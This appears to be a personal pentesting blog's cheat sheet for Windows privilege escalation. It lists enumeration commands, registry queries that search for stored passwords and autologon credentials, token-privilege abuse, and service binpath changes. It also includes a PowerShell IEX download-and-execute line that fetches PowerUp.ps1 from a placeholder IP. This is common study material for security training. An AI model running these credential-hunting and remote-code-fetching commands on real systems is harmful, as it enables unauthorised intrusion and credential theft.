<html>
<head>
    <title>Windows PrivEsc</title>
    <a href="https://pusher91.github.io/Blog/">Return to Main Page</a>
</head>

<hr>

<body>

    <h2>Manual PrivEsc:</h2>
    <li>Use rlwrap on shell to enable arrow usage (up and down to navigate previous commands, left and right to navigate text)</li>
    <li>Check user groups and privileges</li>
    <ul>
        <li>whoami</li>
        <li>whoami /all</li>
        <li>whoami /priv</li>
        <li>whoami /groups</li>
        <li>net user &lt;username&gt;</li>
        <ul>
            <li>Get info about a specific user</li>
        </ul>
    </ul>
    <li>Kernel exploit</li>
    <ul>
        <li>Google the last installed "hotfix + exploit"</li>
    </ul>
    <li>Check folders</li>
    <ul>
        <li>Look for interesting files</li>
        <li>C:\Users\*</li>
        <li>C:\Program Files\</li>
        <li>C:\Program Files (x86)\</li>
    </ul>
    <li>Autologon creds</li>
    <ul>
        <li>get-item -path "HKLM:\software\microsoft\windows nt\currentversion\winlogon"</li>
        <li>reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"</li>
    </ul>
    <li>Check running processes, pay attention to admin</li>
    <ul>
        <li>tasklist /V</li>
        <li>Most application exploits are the same as other misconfigurations (weak folder configurations, unquoted service paths, etc)</li>
    </ul>
    <li>Open ports</li>
    <ul>
        <li>netstat -an</li>
        <ul>
            <li>Ports listening on local host</li>
            <li>Ones not listed during nmap scan/firewalled</li>
        </ul>
    </ul>
    <li>Look for Group Policy (GPP) passwords</li>
    <ul>
        <li>Installed programs/applications</li>
        <ul>
            <li>List applications that are installed by the Windows Installer</li>
            <ul>
                <li>wmic product get name, version, vendor</li>
            </ul>
        </ul>
    </ul>
    <li>Insecure Services</li>
    <ul>
        <li>AllAccess, Start</li>
        <ul>
            <li>Change binpath</li>
        </ul>
    </ul>
    <li>Startup Apps/autorun</li>
    <ul>
        <li>Important if we can reboot the box</li>
    </ul>
    <li>Privilege Abuse</li>
    <ul>
        <li>SeLoadDriverPrivilege</li>
        <li>SeImpersonatePrivilege</li>
        <li>SeImpersonatePrivilege</li>
        <li>SeAssignPrimaryPrivilege</li>
        <li>SeTcbPrivilege</li>
        <li>SeBackupPrivilege</li>
        <ul>
            <li>https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf</li>
        </ul>
        <li>SeRestorePrivilege</li>
        <li>SeCreateTokenPrivilege</li>
        <li>SeLoadDriverPrivilege</li>
        <li>SeTakeOwnershipPrivilege</li>
        <li>SeDebugPrivilege</li>
        <li>Article on exploiting privileges:https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/</li>
    </ul>
    <li>Always Install Elevated</li>
    <li>Abuse GUI Program running as admin</li>
    <ul>
        <li>Inside application open file: file://c:/windows/system32/cmd.exe</li>
        <ul>
            <li>Might get admin command prompt</li>
        </ul>
    </ul>
    <li>Look for exploits for 3rd party drivers</li>
    <ul>
        <li>Enumerate drivers</li>
        <ul>
            <li>driverquery /v</li>
            <li>Powershell - driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object‘Display Name’, ‘Start Mode’, Path</li>
        </ul>
        <li>Enumerate Driver Versions</li>
        <ul>
            <li>Powershell - Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}</li>
        </ul>
    </ul>
    <li>Search the registry for keys and values that contain "password":</li>
    <ul>
        <li>reg query HKLM /f password /t REG_SZ /s</li>
        <li>reg query HKCU /f password /t REG_SZ /s</li>
        <li>reg query "HKLM\software\microsoft\windows nt\currentversion\winlogon"</li>
        <li>reg query "HKCU\software\simontatham\putty\sessions" /s</li>
        <li>reg query HKLM\System\ControlSet001\Control\CurrentPass</li>
        <li>reg query HKLM\System\ControlSet002\Control\CurrentPass</li>
        <li>HKLM\System\CurrentControlSet\Control\CurrentPass</li>
    </ul>
    <li>Scheduled Tasks</li>
    <ul>
        <li>schtasks /query /fo LIST /v</li>
    </ul>
    <li>mysql</li>
    <ul>
        <li>run commands as mysql user</li>
        <ul>
            <li>raptor_winudf</li>
        </ul>
        <li>Search for creds</li>
    </ul>
    <li>Login or run commands as other user using credentials or hashes</li>
    <ul>
        <li>Powershell</li>
        <li>psexec</li>
    </ul>
    <li>Check password attack vectors</li>
    <ul>
        <li>ASREPRoast</li>
        <li>Kerberoast</li>
    </ul>

    <br>

    <h2>PrivEsc Tools</h2>
    <li>Powerup.ps1</li>
    <ul>
        <li>IEX(New-Object Net.WebClient).downloadString('http://&lt;ip address&gt;/PowerUp.ps1&#039;)</li>
        <li>Invoke-AllChecks</li>
    </ul>
    <li></li>










</body>
</html>